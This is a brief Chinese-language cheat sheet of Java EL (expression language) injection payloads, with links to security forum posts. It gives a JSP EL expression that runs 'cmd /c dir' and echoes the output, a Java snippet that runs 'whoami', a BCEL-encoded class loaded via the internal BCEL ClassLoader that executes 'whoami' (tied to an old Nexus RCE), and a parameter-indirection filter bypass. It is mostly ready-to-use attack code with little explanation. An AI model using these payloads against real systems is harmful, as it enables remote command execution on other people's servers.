# EL

https://xz.aliyun.com/t/7692

## 回显

https://forum.butian.net/share/886

```jsp
${
pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("cmd /c dir").getInputStream());
Thread.sleep(1000);
pageContext.setAttribute("inputStreamAvailable", pageContext.getAttribute("inputStream").available());
pageContext.setAttribute("byteBufferClass", Class.forName("java.nio.ByteBuffer"));
pageContext.setAttribute("allocateMethod", pageContext.getAttribute("byteBufferClass").getMethod("allocate", Integer.TYPE));
pageContext.setAttribute("heapByteBuffer", pageContext.getAttribute("allocateMethod").invoke(null, pageContext.getAttribute("inputStreamAvailable")));
pageContext.getAttribute("inputStream").read(pageContext.getAttribute("heapByteBuffer").array(), 0, pageContext.getAttribute("inputStreamAvailable"));
pageContext.setAttribute("byteArrType", pageContext.getAttribute("heapByteBuffer").array().getClass());
pageContext.setAttribute("stringClass", Class.forName("java.lang.String"));
pageContext.setAttribute("stringConstructor", pageContext.getAttribute("stringClass").getConstructor(pageContext.getAttribute("byteArrType")));
pageContext.setAttribute("stringRes", pageContext.getAttribute("stringConstructor").newInstance(pageContext.getAttribute("heapByteBuffer").array()));
pageContext.getAttribute("stringRes")
}
```

```java
InputStream whoami = Runtime.getRuntime().exec("whoami").getInputStream();
Thread.sleep(100);
int whoami1 = whoami.available();
byte[] array = ByteBuffer.allocate(100).array();
whoami.read(array, 0, whoami1);
System.out.println(new String(array));
```
## 加载字节码

+ [Java el 2.1 表达式注入payload(复现上古版本nexus rce)](https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485253&idx=1&sn=b1490922c8b4dfcfde6cfdf425ea8597&chksm=e92f13e6de589af00713b3584841d20c209bf361fe1a1c2fa53e7f37432d7728da008bafde35&scene=178&cur_album_id=1359948349721460737#rd)
```
${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$I$7c$m$n_$A$Deval$$class$A$8dT$5bO$TQ$Q$fe$O$ddv$cb$b2$U$u$d7$827$f0$c2B$vU$f1$da$o$m$V$US$c1$80$c14$3em$b7$87$ba$a4$ddm$b6$5b$c2$3f$f2Uc$d2$gI$7c$f4$c1$9f$e2$8fP$e7l$97$5eB$8d$b6$e9$cc93$df$99$f9f$e6$9c$fe$f8$f5$f5$h$80$3bx$a9$60$Y$8b2$e2$K$fa$84$5e$92$91P$b0$8c$a4$Q$b7$VB$dcU$Q$c4$8a$C$J$f7$84$b8$_$80$P$c2x$u$f4$p$Z$8fe$a4$YB$ab$a6e$bak$M$Bm$e1$90A$ca$d8$F$ce0$945$z$be$5b$x$e7$b9$f3F$cf$97$c8$S$cd$da$86$5e$3a$d4$jS$ec$7d$a3$e4$be7$ab$U$p$cbO$f4R$9a$f6$fc$94$h$M$b7$b4$ec$b1$7e$a2$tK$baUL$k$b8$8ei$V$d3$L$XM$94$d3$u$XD$e8$k$ae$c1$aa$b7$da$ac$99$a5$Cw$Yb$X$40$be$8b$b0$91$7c$ed$e8$88$3b$bc$b0$cfu$P$3c$d5$E$9bvr$b3$cb$p$u$96$a82$ca$ecp$o$ael$9d$g$bc$e2$9a$b6U$95$n$9ce$dd$b4$Y$s$b4w$3d$K$Q$dd$d1$9d$o$j$h$ed$e1$a6$60$Hv$cd1$f8$b6$v$3a$d3$_$3a$b2$yP$wF$Qe$98$fc$L$7d$ca$d6$9b$x$95$7c$ee$d8$b1$w5$97Nq$bd$dc$f4$c9XU$f1$Ek$w$a6$b0$$cC$c5Sl$8aD$Z$n$9e$a9$d8$c2$b6$8a$e7x$c1$c0$U$V$3b$d8$W$b3$nF$M$c3m$k$7b$f9cn$b8TN$x$cf$5e$ab$l$M$pm$e0$7e$cdr$cd2U$a5$U$b9$db$da$8ck$9d3$f5$cd$d4$87$f9$7fL$ff$b5c$h$bcZMw$a5$f0$8d4KJ$d1Q$_5$ee$3cMw$p$e8$f8$94$d6$d3$n$G5$dav$f9$93$X$d60$f9$LYo$fecZ$cf$L$Z$d2$x$Vn$d1$9dL$fc$d7$Vn_$c1$b0k7M$98$c5$Q$3dL$f1$J$80$89$d9$93$i$a5$dd$KiF$3a$b8$d8$A$fbD$8b$3e$8c$91$U$8f$91$8c$f4$3ee$8c$d3Jm$820$81I$d2T$qb$84$Q$B$3e$pD_$ms$86$be$5c$D$81Wg$90rg$I$e6$be$m$U$afC$ae$p$dc$40$7f$D$can$a2$8e$81$5cJ$fa$8e$e8RL$aaC$8d$O$92x$fb$e1$f7$cf$a5$3a$o$a9$60$y$f8$b1$95$7e$da$L$a9$m$8c$Bb$3e$888$oH$R$ff$Nb$$$e8$ac5S$fat$c4j$g3D$x$8c4$$$e12E$99$c5$i$ae$e0$wU$ab$91$e7$g$fd$q$3a$j$m$fb$M$951Gg$q$c2_G$3fn$e0$a6$df$8b$b8W$g$3a$fb$Q$f2$Mc$j$3d$a0$ff$R$cc$7bZ$f3P$L$7f$A$f1$e1$81$9c$fb$E$A$A').newInstance().exec('whoami')}
```
**需要注意jdk版本问题可能没有bcel类**
理论上spel表达式可以用的payLoad 这里也可以利用
## bypass

https://forum.butian.net/share/1880
```java
${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}
```

https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html
